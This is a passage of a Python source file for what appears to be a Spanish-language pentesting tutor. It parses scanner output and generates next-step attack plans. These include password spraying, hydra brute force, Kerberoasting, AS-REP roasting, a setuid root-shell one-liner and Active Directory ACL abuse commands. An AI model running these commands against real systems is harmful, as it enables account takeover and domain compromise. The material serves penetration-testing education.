            "how_to_exploit": info["como_explotar"],
            "defense": info["defensa"],
        }

    return {
        "status": "not_found",
        "message": f"'{concept}' no está en la base integrada. Pregúntame directamente en el chat.",
        "available": list(concepts.keys()),
    }


# ============================================================================
# BLOQUE 2 — ANÁLISIS DE OUTPUT: enum4linux, nikto, wpscan, linpeas, hashes
# ============================================================================


def analyze_enum4linux_output(raw_output: str) -> dict:
    """Analiza output de enum4linux pegado por el estudiante.

    Extrae usuarios, grupos, shares, políticas de contraseñas
    y contexto de dominio. Guía los siguientes pasos de ataque SMB/AD.

    Args:
        raw_output: Output completo de enum4linux -a copiado desde la terminal.

    Returns:
        dict con usuarios, shares, políticas y recomendaciones de ataque.
    """
    if not raw_output or not raw_output.strip():
        return {"status": "error", "message": "Output vacío."}

    lines = raw_output.strip().split("\n")
    users = []
    groups = []
    shares = []
    password_policy = {}
    domain_info = {}
    current_section = None

    for line in lines:
        s = line.strip()

        # Detectar secciones
        if "Users on" in s or "user:[" in s.lower():
            current_section = "users"
        elif "Groups on" in s or "group:[" in s.lower():
            current_section = "groups"
        elif "Shares on" in s or "Sharename" in s:
            current_section = "shares"
        elif "Password Policy" in s:
            current_section = "policy"
        elif "Domain=" in s or "Workgroup=" in s:
            current_section = "domain"

        # Parsear usuarios: user:[nombre] rid:[xxx]
        # Parsear usuarios: user:[nombre] rid:[xxx]
        user_match = re.search(r"user:\[([^\]]+)\]\s+rid:\[([^\]]+)\]", s)
        if user_match and current_section in ("users", None):
            users.append({"username": user_match.group(1), "rid": user_match.group(2)})

        # Parsear grupos
        group_match = re.search(r"group:\[([^\]]+)\]\s+rid:\[([^\]]+)\]", s)
        if group_match and current_section in ("groups", None):
            groups.append({"group": group_match.group(1), "rid": group_match.group(2)})

        # Parsear shares de smbclient
        share_match = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*)", s)
        if share_match and current_section in ("shares", None):
            shares.append(
                {
                    "name": share_match.group(1),
                    "type": share_match.group(2),
                    "comment": share_match.group(3).strip(),
                }
            )

        # Parsear política de contraseñas
        if "Minimum password length" in s:
            m = re.search(r"(\d+)", s)
            password_policy["min_length"] = int(m.group(1)) if m else "desconocido"
        if "Account Lockout Threshold" in s:
            m = re.search(r"(\d+)", s)
            password_policy["lockout_threshold"] = int(m.group(1)) if m else 0
        if "Password must meet complexity" in s:
            password_policy["complexity"] = "Yes" in s or "1" in s

        # Info de dominio
        dm = re.search(r"Domain=\[([^\]]+)\]", s)
        if dm:
            domain_info["domain"] = dm.group(1)
        wg = re.search(r"Workgroup=\[([^\]]+)\]", s)
        if wg:
            domain_info["workgroup"] = wg.group(1)

    # Generar recomendaciones basadas en hallazgos
    attack_recommendations = []

    if users:
        usernames = [u["username"] for u in users]
        attack_recommendations.append(
            {
                "vector": "Brute force / Password spray con lista de usuarios real",
                "razon": f"Tienes {len(users)} usuarios enumerados sin autenticación. "
                "En entornos reales esto es una misconfiguration crítica.",
                "comandos": [
                    f"crackmapexec smb <IP> -u {','.join(usernames[:5])} -p /usr/share/wordlists/rockyou.txt",
                    "# Password spray (menos agresivo, evita lockout):",
                    "crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success",
                    "# AS-REP Roasting (si es dominio AD — no necesita contraseña):",
                    f"impacket-GetNPUsers {domain_info.get('domain', '<DOMAIN>')}/ "
                    f"-usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat",
                ],
            }
        )

    lockout = password_policy.get("lockout_threshold", 0)
    if lockout == 0:
        attack_recommendations.append(
            {
                "vector": "Sin política de lockout — brute force sin límite",
                "razon": "Account Lockout Threshold = 0 significa que puedes hacer "
                "brute force sin riesgo de bloquear cuentas.",
                "comandos": [
                    "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> smb",
                ],
            }
        )
    elif lockout and lockout <= 5:
        attack_recommendations.append(
            {
                "vector": "Lockout bajo — usar password spray con cuidado",
                "razon": f"Threshold de {lockout} intentos. Usar spray con 1 contraseña "
                "y esperar entre rondas.",
                "comandos": [
                    "crackmapexec smb <IP> -u users.txt -p 'Password1' --continue-on-success",
                    "# Esperar 30min antes de siguiente spray",
                ],
            }
        )

    accessible_shares = [
        s for s in shares if s["type"] == "Disk" and s["name"] not in ("IPC$",)
    ]
    if accessible_shares:
        attack_recommendations.append(
            {
                "vector": "Shares accesibles para enumeración de contenido",
                "razon": "Shares de disco con null session suelen contener "
                "configuraciones, scripts o documentos con credenciales.",
                "comandos": [
                    f"smbclient //<IP>/{s['name']} -N" for s in accessible_shares[:4]
                ]
                + ["# Dentro: recurse ON; prompt OFF; mget *"],
            }
        )

    return {
        "status": "success",
        "users_found": users,
        "user_count": len(users),
        "groups_found": groups,
        "shares_found": shares,
        "password_policy": password_policy,
        "domain_info": domain_info,
        "attack_recommendations": attack_recommendations,
        "next_steps": {
            "if_domain_joined": "Usar bloodhound-python para mapear paths a Domain Admin",
            "if_workgroup": "Foco en shares accesibles y brute force local",
            "always": "Guardar lista de usuarios en users.txt para ataques posteriores",
        },
    }


def analyze_nikto_output(raw_output: str) -> dict:
    """Analiza output de nikto pegado por el estudiante.

    Clasifica los hallazgos por severidad, filtra los informativos
    de los explotables y sugiere los siguientes pasos de web testing.

    Args:
        raw_output: Output de nikto -h <IP> copiado desde la terminal.

    Returns:
        dict con hallazgos clasificados y pasos de investigación manual.
    """
    if not raw_output or not raw_output.strip():
        return {"status": "error", "message": "Output vacío."}

    lines = raw_output.strip().split("\n")
    findings = []
    target = None
    server_info = {}

    for line in lines:
        s = line.strip()

        # Extraer target
        if "Target IP:" in s:
            m = re.search(r"Target IP:\s+(\S+)", s)
            if m:
                target = m.group(1)
        if "Target Hostname:" in s:
            m = re.search(r"Target Hostname:\s+(\S+)", s)
            if m:
                server_info["hostname"] = m.group(1)
        if "Server:" in s and "+" not in s[:3]:
            m = re.search(r"Server:\s+(.+)", s)
            if m:
                server_info["server"] = m.group(1).strip()

        # Líneas de hallazgo: empiezan con "+"
        if s.startswith("+ "):
            finding_text = s[2:].strip()
            severity = _classify_nikto_finding(finding_text)
            findings.append(
                {
                    "finding": finding_text,
                    "severity": severity,
                    "actionable": severity in ("high", "medium"),
                }
            )

    high = [f for f in findings if f["severity"] == "high"]
    medium = [f for f in findings if f["severity"] == "medium"]
    info = [f for f in findings if f["severity"] == "info"]

    investigation = _nikto_investigation_steps(high + medium, target or "<IP>")

    return {
        "status": "success",
        "target": target or "desconocido",
        "server_info": server_info,
        "total_findings": len(findings),
        "high_severity": high,
        "medium_severity": medium,
        "informational": info,
        "investigation_steps": investigation,
        "note": "Nikto genera muchos falsos positivos — cada hallazgo debe verificarse manualmente con curl o Burp.",
    }


def _classify_nikto_finding(text: str) -> str:
    t = text.lower()
    high_indicators = [
        "osvdb",
        "cve-",
        "sql",
        "xss",
        "injection",
        "rce",
        "remote code",
        "admin",
        "phpinfo",
        "config",
        "backup",
        "password",
        ".git",
        ".env",
        "htpasswd",
        "shell",
        "upload",
        "webshell",
        "default credentials",
        "anonymous",
        "phpmyadmin",
        "manager",
        "console",
    ]
    medium_indicators = [
        "x-frame-options",
        "x-xss-protection",
        "content-security-policy",
        "clickjacking",
        "directory indexing",
        "index of",
        "etag",
        "server version",
        "methods allowed",
        "delete",
        "put",
        "trace",
        "debug",
        "options",
    ]
    if any(kw in t for kw in high_indicators):
        return "high"
    if any(kw in t for kw in medium_indicators):
        return "medium"
    return "info"


def _nikto_investigation_steps(actionable: list, target: str) -> list:
    steps = []
    for f in actionable[:8]:
        text = f["finding"]
        step = {"finding": text[:120], "severity": f["severity"], "verify_with": []}

        if "OSVDB" in text or "CVE" in text:
            cve_match = re.search(r"(CVE-[\d-]+|OSVDB-\d+)", text)
            step["verify_with"] = [
                f"searchsploit {cve_match.group(1) if cve_match else 'apache'}",
                "Buscar en https://nvd.nist.gov",
            ]
        elif any(kw in text.lower() for kw in [".git", ".env", "config", "backup"]):
            path_match = re.search(r"(/[^\s]+)", text)
            path = path_match.group(1) if path_match else "/<ruta>"
            step["verify_with"] = [
                f"curl -sv http://{target}{path}",
                f"wget http://{target}{path}",
            ]
        elif "admin" in text.lower() or "manager" in text.lower():
            step["verify_with"] = [
                f"# Visitar en browser: http://{target}/admin",
                "Probar credenciales por defecto: admin:admin, admin:password",
                "Probar SQLi: admin'--",
            ]
        elif any(kw in text.lower() for kw in ["methods", "put", "delete", "trace"]):
            step["verify_with"] = [
                f"curl -X OPTIONS http://{target} -v",
                f"curl -X TRACE http://{target} -v",
            ]
        else:
            step["verify_with"] = [f"curl -sv http://{target} | grep -i '{text[:30]}'"]

        steps.append(step)
    return steps


def analyze_wpscan_output(raw_output: str) -> dict:
    """Analiza output de wpscan pegado por el estudiante.

    Extrae versión de WordPress, plugins/themes vulnerables,
    usuarios enumerados y genera el plan de ataque específico.

    Args:
        raw_output: Output de wpscan --url <IP> copiado desde la terminal.

    Returns:
        dict con versión, plugins, usuarios vulnerables y vectores de ataque.
    """
    if not raw_output or not raw_output.strip():
        return {"status": "error", "message": "Output vacío."}

    lines = raw_output.strip().split("\n")
    wp_version = None
    plugins = []
    themes = []
    users = []
    vulnerabilities = []
    target_url = None
    current_plugin = None

    for line in lines:
        s = line.strip()

        # URL objetivo
        if "URL:" in s and "http" in s:
            m = re.search(r"(https?://\S+)", s)
            if m and not target_url:
                target_url = m.group(1).rstrip("/")

        # Versión WordPress
        if "WordPress version" in s or "[+] WordPress version" in s:
            m = re.search(r"(\d+\.\d+[\.\d]*)", s)
            if m:
                wp_version = m.group(1)

        # Plugins detectados
        if "[+]" in s and "plugin" in s.lower():
            m = re.search(r"\[+\]\s+(.+?)(?:\s+found|\s+version|\s+-)", s)
            if m:
                current_plugin = {
                    "name": m.group(1).strip(),
                    "version": None,
                    "vulnerabilities": [],
                }
                plugins.append(current_plugin)

        # Versión de plugin
        if current_plugin and "Version:" in s:
            m = re.search(r"Version:\s+([\d.]+)", s)
            if m:
                current_plugin["version"] = m.group(1)

        # Vulnerabilidades (líneas con CVE o [!])
        if ("CVE" in s or "[!" in s or "VULNERABILITY" in s.upper()) and current_plugin:
            current_plugin["vulnerabilities"].append(s)
        elif "CVE" in s:
            vulnerabilities.append(s)

        # Usuarios enumerados
        if "| Login:" in s or ("Found:" in s and "/" in s):
            m = re.search(r"Login:\s+(\S+)", s) or re.search(r"Found:\s+(\S+)", s)
            if m:
                users.append(m.group(1))

        # Themes
        if "[+]" in s and "theme" in s.lower():
            m = re.search(r"\[+\]\s+(.+?)(?:\s+found|\s+version)", s)
            if m:
                themes.append({"name": m.group(1).strip(), "version": None})

    # Clasificar plugins con vulnerabilidades
    vuln_plugins = [p for p in plugins if p["vulnerabilities"]]
    safe_plugins = [p for p in plugins if not p["vulnerabilities"]]

    attack_plan = _build_wordpress_attack_plan(
        wp_version, vuln_plugins, users, target_url or "<URL>"
    )

    return {
        "status": "success",
        "target_url": target_url,
        "wordpress_version": wp_version,
        "plugins_found": len(plugins),
        "vulnerable_plugins": vuln_plugins,
        "safe_plugins": safe_plugins,
        "themes_found": themes,
        "users_enumerated": users,
        "additional_vulnerabilities": vulnerabilities,
        "attack_plan": attack_plan,
    }


def _build_wordpress_attack_plan(version, vuln_plugins, users, url):
    plan = []

    if vuln_plugins:
        for p in vuln_plugins[:3]:
            plan.append(
                {
                    "prioridad": "alta",
                    "vector": f"Plugin vulnerable: {p['name']} {p['version'] or ''}",
                    "accion": "Buscar exploit específico para este plugin y versión",
                    "comandos": [
                        f"searchsploit wordpress {p['name']}",
                        f"searchsploit wordpress {p['name']} {p['version'] or ''}",
                    ],
                }
            )

    if users:
        plan.append(
            {
                "prioridad": "alta",
                "vector": f"Usuarios enumerados: {', '.join(users)}",
                "accion": "Brute force del panel wp-admin con usuarios reales",
                "comandos": [
                    f"wpscan --url {url} -U {','.join(users)} -P /usr/share/wordlists/rockyou.txt",
                    f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {url.split('/')[2]} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect'",
                ],
            }
        )
    else:
        plan.append(
            {
                "prioridad": "media",
                "vector": "Enumerar usuarios (no encontrados aún)",
                "accion": "wpscan puede encontrar usuarios por author ID o API REST",
                "comandos": [
                    f"wpscan --url {url} --enumerate u",
                    f"curl {url}/?author=1",
                    f"curl {url}/wp-json/wp/v2/users",
                ],
            }
        )

    if version:
        major_minor = ".".join(version.split(".")[:2])
        plan.append(
            {
                "prioridad": "media",
                "vector": f"WordPress core {version}",
                "accion": "Verificar si la versión core tiene CVEs conocidos",
                "comandos": [
                    f"searchsploit wordpress {major_minor}",
                    f"# Referencia: https://wpscan.com/wordpresses/{version.replace('.', '')}",
                ],
            }
        )

    plan.append(
        {
            "prioridad": "media",
            "vector": "xmlrpc.php",
            "accion": "Comprobar si xmlrpc está habilitado — permite brute force sin lockout",
            "comandos": [
                f"curl -s {url}/xmlrpc.php",
                "# Si responde 200/405: está activo → usar wpscan o Burp para brute force",
            ],
        }
    )

    return plan


def analyze_linpeas_output(raw_output: str) -> dict:
    """Analiza output de LinPEAS pegado por el estudiante.

    Filtra los hallazgos de alta prioridad, los organiza por categoría
    de escalada de privilegios y genera el plan de acción ordenado.

    Args:
        raw_output: Output de linpeas.sh copiado desde la terminal.

    Returns:
        dict con vectores de escalada ordenados por prioridad.
    """
    if not raw_output or not raw_output.strip():
        return {
            "status": "error",
            "message": "Output vacío. LinPEAS genera mucho output — pega al menos las secciones relevantes.",
        }

    lines = raw_output.strip().split("\n")
    findings = {
        "sudo": [],
        "suid": [],
        "cron": [],
        "capabilities": [],
        "writable_paths": [],
        "credentials": [],
        "kernel_exploits": [],
        "services": [],
        "other": [],
    }

    current_section = "other"

    for line in lines:
        s = line.strip()
        if not s:
            continue

        # Detectar sección por headers de LinPEAS
        sl = s.lower()
        if "sudo" in sl and ("version" in sl or "=====" in s):
            current_section = "sudo"
        elif "suid" in sl and "=====" in s:
            current_section = "suid"
        elif "cron" in sl and "=====" in s:
            current_section = "cron"
        elif "capabilit" in sl and "=====" in s:
            current_section = "capabilities"
        elif "writable" in sl and "=====" in s:
            current_section = "writable_paths"
        elif "password" in sl and "=====" in s:
            current_section = "credentials"
        elif "kernel" in sl and "exploit" in sl:
            current_section = "kernel_exploits"
        elif "active ports" in sl or "listening" in sl:
            current_section = "services"

        # Capturar líneas con indicadores de alta prioridad
        # LinPEAS usa códigos ANSI — filtrar líneas con contenido relevante
        clean = re.sub(r"\x1b\[[0-9;]*m", "", s)  # strip ANSI

        is_interesting = (
            "NOPASSWD" in clean
            or re.search(r"-rws", clean)  # SUID binario
            or "capabilities" in clean.lower()
            or re.search(r"cap_set", clean)
            or "password" in clean.lower()
            or re.search(r"\$\d?\$", clean)  # hash en /etc/shadow style
            or "CVE-" in clean
            or re.search(r"writable.*root|root.*writable", clean, re.I)
        )

        if is_interesting and len(clean) > 10:
            entry = {"raw": clean[:200], "section": current_section}
            if current_section in findings:
                findings[current_section].append(entry)
            else:
                findings["other"].append(entry)

    # Construir plan de acción ordenado
    action_plan = _build_privesc_action_plan(findings)

    total_findings = sum(len(v) for v in findings.values())

    return {
        "status": "success" if total_findings > 0 else "no_highlights",
        "message": (
            f"Se encontraron {total_findings} indicadores de interés. "
            "Si el número es bajo, puede que el output pegado sea parcial."
        ),
        "findings_by_category": findings,
        "action_plan": action_plan,
        "tip": (
            "LinPEAS codifica por colores: rojo/amarillo = alta prioridad. "
            "Si pegas el output completo (incluyendo secuencias ANSI), "
            "el análisis es más preciso."
        ),
    }


def _build_privesc_action_plan(findings: dict) -> list:
    plan = []

    if findings["sudo"]:
        plan.append(
            {
                "prioridad": "1 — CRÍTICA",
                "categoria": "sudo",
                "accion": "Revisar cada entrada NOPASSWD en gtfobins.github.io",
                "hallazgos": [f["raw"] for f in findings["sudo"][:5]],
                "comando": "sudo -l  # confirmar en el sistema",
            }
        )

    if findings["suid"]:
        suid_binaries = [re.search(r"(/[^\s]+)", f["raw"]) for f in findings["suid"]]
        suid_paths = [m.group(1) for m in suid_binaries if m]
        plan.append(
            {
                "prioridad": "2 — ALTA",
                "categoria": "suid",
                "accion": "Comprobar cada binario SUID inusual en gtfobins.github.io",
                "hallazgos": suid_paths[:8],
                "comando": "find / -perm -u=s -type f 2>/dev/null  # verificar lista completa",
            }
        )

    if findings["capabilities"]:
        plan.append(
            {
                "prioridad": "2 — ALTA",
                "categoria": "capabilities",
                "accion": "cap_setuid o cap_sys_admin en Python/Perl/Ruby → escalada directa",
                "hallazgos": [f["raw"] for f in findings["capabilities"][:5]],
                "comando": "getcap -r / 2>/dev/null",
                "ejemplo": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            }
        )

    if findings["cron"]:
        plan.append(
            {
                "prioridad": "3 — ALTA",
                "categoria": "cron",
                "accion": "Verificar si los scripts del cron son escribibles por tu usuario",
                "hallazgos": [f["raw"] for f in findings["cron"][:5]],
                "comando": "ls -la <ruta_del_script>  # verificar permisos",
            }
        )

    if findings["credentials"]:
        plan.append(
            {
                "prioridad": "3 — ALTA",
                "categoria": "credentials",
                "accion": "Credenciales en texto claro o hashes — intentar reutilización",
                "hallazgos": [f["raw"] for f in findings["credentials"][:5]],
                "comando": "su <usuario>  # con la contraseña encontrada",
            }
        )

    if findings["kernel_exploits"]:
        plan.append(
            {
                "prioridad": "5 — ÚLTIMO RECURSO",
                "categoria": "kernel",
                "accion": "Kernel exploit — inestable, puede crashear el sistema. Solo si no hay otro vector.",
                "hallazgos": [f["raw"] for f in findings["kernel_exploits"][:3]],
                "comando": "searchsploit linux kernel <version>",
            }
        )

    if not plan:
        plan.append(
            {
                "prioridad": "N/A",
                "categoria": "sin_hallazgos",
                "accion": (
                    "No se detectaron vectores automáticos. Opciones: "
                    "(1) el output pegado es parcial, "
                    "(2) hay vectores que requieren análisis manual más profundo. "
                    "Revisar: archivos de configuración en /opt /var/www /home, "
                    "variables de entorno, servicios internos (ss -tlnp), "
                    "versión del kernel para exploits públicos."
                ),
                "hallazgos": [],
            }
        )

    return plan


def analyze_hash(hash_string: str) -> dict:
    """Identifica el tipo de hash y proporciona el modo de hashcat y comando de cracking.

    Análisis basado en el formato y longitud del hash.
    Paso previo obligatorio antes de ejecutar hashcat o john.

    Args:
        hash_string: El hash a identificar (sin prefijos, solo el valor).

    Returns:
        dict con tipo probable, modo hashcat, modo john y comandos de cracking.
    """
    if not hash_string:
        return {"status": "error", "message": "Proporciona el hash a analizar."}

    h = hash_string.strip()
    length = len(h)
    results = []

    # Patrones de identificación por formato y longitud
    patterns = [
        # Unix/Linux shadow
        (r"^\$1\$", "MD5Crypt (Linux shadow)", 500, "md5crypt"),
        (r"^\$2[ayb]\$", "bcrypt", 3200, "bcrypt"),
        (r"^\$5\$", "sha256crypt (Linux shadow)", 7400, "sha256crypt"),
        (r"^\$6\$", "sha512crypt (Linux shadow)", 1800, "sha512crypt"),
        (r"^\$y\$", "yescrypt (moderno)", 11500, "yescrypt"),
        # Windows
        (r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", "NTLM (LM:NT formato)", 1000, "nt"),
        (r"^[a-fA-F0-9]{32}$", "MD5 o NTLM", None, None),  # ambiguo por longitud
        # Kerberos
        (r"^\$krb5tgs\$", "TGS-REP (Kerberoasting)", 13100, "krb5tgs"),
        (r"^\$krb5asrep\$", "AS-REP (AS-REP Roasting)", 18200, "krb5asrep"),
        # NetNTLM
        (
            r"^[^:]+::[^:]+:[a-fA-F0-9]+:[a-fA-F0-9]+:[a-fA-F0-9]+$",
            "NetNTLMv2 (Responder)",
            5600,
            "netntlmv2",
        ),
        # Web/App
        (r"^\$apr1\$", "Apache MD5", 1600, "md5crypt-long"),
        (r"^\$P\$", "PHPass (WordPress)", 400, "phpass"),
        (r"^\$S\$", "Drupal SHA512", 7900, "drupal7"),
    ]

    # Match por patrón primero
    matched = False
    for pattern, name, hc_mode, john_format in patterns:
        if re.match(pattern, h):
            results.append(
                {
                    "type": name,
                    "confidence": "alta",
                    "hashcat_mode": hc_mode,
                    "john_format": john_format,
                }
            )
            matched = True
            break

    # Si no hay match por patrón, identificar por longitud
    if not matched:
        length_map = {
            32: [("MD5", 0, "raw-md5"), ("NTLM", 1000, "nt")],
            40: [("SHA1", 100, "raw-sha1")],
            56: [("SHA224", 1300, "raw-sha224")],
            64: [("SHA256", 1400, "raw-sha256")],
            96: [("SHA384", 10800, "raw-sha384")],
            128: [("SHA512", 1700, "raw-sha512")],
        }
        if length in length_map:
            for name, hc_mode, john_format in length_map[length]:
                results.append(
                    {
                        "type": name,
                        "confidence": "media — verificar con hashid en la VM",
                        "hashcat_mode": hc_mode,
                        "john_format": john_format,
                    }
                )
        else:
            results.append(
                {
                    "type": "desconocido",
                    "confidence": "baja",
                    "hashcat_mode": None,
                    "john_format": None,
                }
            )

    # Generar comandos para cada candidato
    commands = []
    for r in results:
        if r["hashcat_mode"] is not None:
            commands.append(
                {
                    "herramienta": "hashcat",
                    "comando": f"hashcat -m {r['hashcat_mode']} hash.txt /usr/share/wordlists/rockyou.txt",
                    "con_reglas": f"hashcat -m {r['hashcat_mode']} hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                    "tipo": r["type"],
                }
            )
        if r["john_format"]:
            commands.append(
                {
                    "herramienta": "john",
                    "comando": f"john hash.txt --format={r['john_format']} --wordlist=/usr/share/wordlists/rockyou.txt",
                    "tipo": r["type"],
                }
            )

    return {
        "status": "success",
        "hash_analyzed": h[:80] + ("..." if len(h) > 80 else ""),
        "hash_length": length,
        "probable_types": results,
        "cracking_commands": commands,
        "verify_commands": [
            "hashid '<hash>'  # en la VM",
            "name-that-hash -t '<hash>'  # más preciso que hashid",
        ],
        "online_check_first": [
            "https://crackstation.net  — base de datos de 15B hashes",
            "https://ntlm.pw  — específico para NTLM",
            "https://hashes.com  — múltiples formatos",
        ],
    }


# ============================================================================
# BLOQUE 3 — FASES NUEVAS: OSINT, AD ATTACKS, REPORTING
# ============================================================================


def generate_pentest_commands_extended(
    phase: str, target: str = "", context: str = ""
) -> dict:
    """Fases adicionales del flujo profesional no cubiertas en generate_pentest_commands.

    Complementa las fases base con: OSINT externo, Active Directory attacks
    completo, y la fase de reporting (crítica para inserción laboral).

    Args:
        phase: 'osint' | 'active_directory' | 'reporting' | 'wireless' | 'api_testing'
        target: Dominio, IP o nombre del objetivo.
        context: Información de contexto adicional.

    Returns:
        dict con pasos ordenados y notas profesionales.
    """
    t = target or "<OBJETIVO>"

    phases = {
        "osint": {
            "nombre": "OSINT — Reconocimiento pasivo externo",
            "objetivo": (
                "Recopilar información pública sobre el objetivo SIN interactuar "
                "directamente con sus sistemas. En auditorías reales esta fase "
                "precede a cualquier escaneo activo."
            ),
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Infraestructura DNS y dominios",
                    "comandos": [
                        f"whois {t}",
                        f"dig {t} ANY",
                        f"dig {t} MX  # servidores de correo",
                        f"dig {t} NS  # nameservers",
                        f"fierce --domain {t}  # transferencia de zona + brute force DNS",
                        f"subfinder -d {t}  # subdominios pasivos",
                        f"amass enum -passive -d {t}  # OSINT de subdominios",
                    ],
                    "por_que": "El DNS revela la infraestructura: servidores de mail, CDNs, "
                    "subdominios olvidados (dev., staging., old.) que suelen ser "
                    "más vulnerables que producción.",
                },
                {
                    "n": 2,
                    "nombre": "Motores de búsqueda y Google Dorks",
                    "comandos": [
                        f"site:{t}  # todos los subdominios indexados",
                        f"site:{t} filetype:pdf OR filetype:doc OR filetype:xls  # documentos",
                        f"site:{t} inurl:admin OR inurl:login OR inurl:panel",
                        f'site:{t} "password" OR "credential" OR "config"',
                        f'"@{t}" site:linkedin.com  # empleados y tecnologías usadas',
                        "# Shodan: https://www.shodan.io → buscar por IP o dominio",
                        "# Censys: https://search.censys.io",
                    ],
                    "por_que": "Google Dorks pueden revelar archivos sensibles indexados, "
                    "paneles de admin expuestos y empleados (para spear phishing "
                    "o ingeniería social en red team).",
                },
                {
                    "n": 3,
                    "nombre": "Filtraciones y credenciales expuestas",
                    "comandos": [
                        f"# haveibeenpwned.com/domain/{t}  — dominio en brechas conocidas",
                        f"# dehashed.com — buscar emails @{t}",
                        f"# GitHub/GitLab search: '{t} password' OR '{t} secret' OR '{t} api_key'",
                        f"# Pastebin/GrayhatWarfare para S3 buckets: {t}",
                        "theHarvester -d {t} -b google,linkedin,bing -l 200",
                    ],
                    "por_que": "Las credenciales de brechas anteriores son uno de los "
                    "vectores de entrada más comunes en auditorías reales — "
                    "password reuse es omnipresente.",
                },
                {
                    "n": 4,
                    "nombre": "Tecnologías y versiones (sin tocar el servidor)",
                    "comandos": [
                        f"# Wappalyzer (extensión browser) al visitar {t}",
                        f"# BuiltWith: https://builtwith.com/{t}",
                        f"# Netcraft: https://sitereport.netcraft.com/?url={t}",
                        f"# SecurityHeaders: https://securityheaders.com/?q={t}",
                        f"# SSL Labs: https://www.ssllabs.com/ssltest/analyze.html?d={t}",
                    ],
                    "por_que": "Identificar el stack tecnológico sin hacer requests activos. "
                    "SSL Labs revela versiones de TLS, certificados y configuración "
                    "de cifrado — información valiosa y completamente pasiva.",
                },
            ],
            "notas_profesionales": [
                "En auditorías con scope definido: confirmar con el cliente si el OSINT "
                "pasivo sobre empleados/email está dentro del alcance.",
                "Documentar TODAS las fuentes y timestamps — el OSINT es evidencia.",
                "theHarvester + Maltego son las herramientas estándar en la industria.",
                "Un dominio abandonado del cliente puede ser el punto de entrada más fácil.",
            ],
        },
        "active_directory": {
            "nombre": "Active Directory — Attacks completo",
            "objetivo": (
                "Desde un usuario de dominio de bajo privilegio → Domain Admin. "
                "AD está presente en el 80%+ de entornos empresariales. "
                "Esta metodología cubre el path completo."
            ),
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Enumeración inicial con credenciales de dominio",
                    "comandos": [
                        "crackmapexec smb <DC_IP> -u <user> -p <pass> --users --groups --shares",
                        "ldapdomaindump -u '<DOMAIN>\\<user>' -p <pass> <DC_IP> -o ldap_dump/",
                        "# ldapdomaindump genera HTMLs navegables con toda la info del dominio",
                        "enum4linux-ng -A <DC_IP> -u <user> -p <pass>",
                    ],
                    "por_que": "Con cualquier credencial de dominio (aunque sea de un usuario "
                    "sin privilegios) puedes leer casi toda la estructura del AD. "
                    "Es por diseño — LDAP está disponible para todos los usuarios autenticados.",
                },
                {
                    "n": 2,
                    "nombre": "BloodHound — mapear paths de ataque",
                    "comandos": [
                        "# Recolectar datos (desde Linux con creds):",
                        "bloodhound-python -d <DOMAIN> -u <user> -p <pass> -ns <DC_IP> -c all --zip",
                        "",
                        "# Arrancar BloodHound:",
                        "sudo neo4j console &",
                        "bloodhound &",
                        "# Importar el ZIP generado",
                        "",
                        "# Queries esenciales en BloodHound:",
                        "# → 'Shortest Paths to Domain Admins from Owned Principals'",
                        "# → 'Find Principals with DCSync Rights'",
                        "# → 'Kerberoastable Accounts'",
                        "# → 'Find AS-REP Roastable Users'",
                        "# → 'Find Computers where Domain Users are Local Admin'",
                    ],
                    "por_que": "BloodHound visualiza relaciones de AD que serían imposibles "
                    "de ver manualmente. Encuentra paths como: "
                    "usuario → GenericWrite sobre grupo → grupo tiene acceso a DC. "
                    "Es la herramienta estándar en red team y pentesting AD.",
                },
                {
                    "n": 3,
                    "nombre": "Kerberoasting — service accounts con contraseñas crackeable",
                    "comandos": [
                        "impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt",
                        "hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt",
                        "hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
                    ],
                    "por_que": "Las service accounts suelen tener contraseñas antiguas, débiles "
                    "y raramente rotadas. Además, suelen tener privilegios elevados "
                    "(backup, database, deployment). Si el TGS se crackea → "
                    "escalada directa.",
                },
                {
                    "n": 4,
                    "nombre": "AS-REP Roasting — usuarios sin pre-auth Kerberos",
                    "comandos": [
                        "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep_hashes.txt",
                        "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
                    ],
                    "por_que": "Usuarios con 'Do not require Kerberos preauthentication' "
                    "permiten solicitar su hash AS-REP sin autenticación previa. "
                    "Más raro que Kerberoasting pero cuando aparece es fácil.",
                },
                {
                    "n": 5,
                    "nombre": "ACL Abuses — abuso de permisos en objetos AD",
                    "comandos": [
                        "# Identificar con BloodHound: 'Outbound Object Control'",
                        "# Si tienes GenericWrite sobre un usuario → forzar SPN (Kerberoasting dirigido):",
                        "impacket-addspn -u '<DOMAIN>\\<tuuser>' -p <pass> -t <usuario_objetivo> -s 'cifs/fake' <DC_IP>",
                        "",
                        "# Si tienes GenericWrite sobre un grupo → añadirse al grupo:",
                        "net rpc group addmem '<GRUPO>' '<tu_usuario>' -U '<DOMAIN>/<tuuser>%<pass>' -S <DC_IP>",
                        "",
                        "# Si tienes ForceChangePassword → cambiar contraseña sin conocer la actual:",
                        "impacket-rpcclient <DC_IP> -U '<DOMAIN>/<tuuser>%<pass>' -c 'setuserinfo2 <victim_user> 23 NewPass123!'",
                    ],
                    "por_que": "Los ACL abuses son el vector de movimiento lateral más "
                    "sofisticado y frecuente en auditorías reales. BloodHound "
                    "los detecta automáticamente — sin él son prácticamente invisibles.",
                },
                {
                    "n": 6,
                    "nombre": "NTLM Relay — cuando SMB signing está deshabilitado",
                    "comandos": [
                        "# Paso 1: identificar hosts sin SMB signing:",
                        "crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt",
                        "",
